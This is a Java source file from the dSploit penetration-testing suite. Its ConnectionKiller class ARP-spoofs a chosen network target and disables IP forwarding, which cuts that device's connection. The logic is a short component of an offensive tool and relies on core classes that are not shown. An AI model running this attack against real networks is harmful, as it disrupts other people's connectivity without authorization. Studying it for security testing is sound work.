/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import it.evilsocket.dsploit.core.Shell.OutputReceiver;
import it.evilsocket.dsploit.core.System;

public class ConnectionKiller {
    public static void start() {
        System.getArpSpoof().spoof(System.getCurrentTarget(), new OutputReceiver() {

            @Override
            public void onStart(String command) {
                // just in case :)
                System.setForwarding(false);
            }

            @Override
            public void onNewLine(String line) {
            }

            @Override
            public void onEnd(int exitCode) {
            }
        })
                .start();
    }

    public static void stop() {
        System.setForwarding(false);
        System.getArpSpoof().kill();
    }
}
